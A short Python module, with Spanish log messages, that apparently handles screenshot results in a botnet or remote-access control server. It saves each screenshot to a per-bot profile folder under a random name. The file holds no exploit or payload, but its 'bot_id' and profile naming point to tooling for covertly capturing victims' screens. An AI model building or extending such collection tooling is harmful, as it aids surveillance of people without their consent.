from secrets import token_urlsafe
from utils.UI import debug
from utils.sys_utils import bytes_convert

from conf import global_conf

profile = '{}/{}'.format(global_conf.databases['database'], global_conf.databases['profiles'])

def main(result, log, bot_id):

    if (isinstance(result, list)):

        if (len(result) == 0):

            log.logger('¡No se obtuvieron capturas de pantalla!', debug.COM)

        else:

            log.logger('Se obtuvieron %d capturas de pantalla' % (len(result)), debug.PER) if (len(result) > 1) else log.logger('Se obtuvo 1 captura de pantalla', debug.PER)

            log.logger('Guardando ...', debug.INF)

            for _ in result:

                filename = '{}/{}/{}.screenshot.png'.format(profile, bot_id, token_urlsafe(32))

                with open(filename, 'wb') as file_object:

                    file_object.write(bytes_convert.convert(_))

                log.logger('Guardado: "{}"'.format(filename), debug.PER)

    else:

        log.logger('El tipo de dato de los resultados de las capturas de pantalla no son correctos', debug.WAR)
